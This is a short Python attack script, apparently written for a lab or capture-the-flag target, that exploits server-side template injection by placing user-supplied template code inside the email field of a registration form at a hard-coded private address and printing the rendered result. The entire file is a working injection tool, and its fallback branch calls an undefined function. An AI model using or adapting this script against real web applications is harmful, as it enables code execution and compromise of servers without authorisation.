#!/usr/bin/env python3
import requests
from urllib.parse import quote_plus
from bs4 import BeautifulSoup
from argparse import ArgumentParser


class SSTI():
	def __init__(self, url):
		self.url = url

	def register(self, code, pw='a'):
		user = '{{' + code + '}}@b.co'
		pw = quote_plus(pw)
		headers = {
			'Accept-Encoding': 'gzip, deflate',
			'Content-Type': 'application/x-www-form-urlencoded'
		}
		data = {
			'email': user,
			'password': pw,
			'confirm': pw
		}
		r = requests.post(self.url, headers=headers, data=data)
		soup = BeautifulSoup(r.text, features='lxml')
		template = soup.select_one('p.help-block')

		if template:
			return template.text
		else:
			return register(user, pw)


def get_args():
	parser = ArgumentParser()
	parser.add_argument('code', help='Code to inject')
	return parser.parse_args()


if __name__ == '__main__':
	args = get_args()
	temp = SSTI('http://10.102.2.251/user/register')
	print(temp.register(args.code))
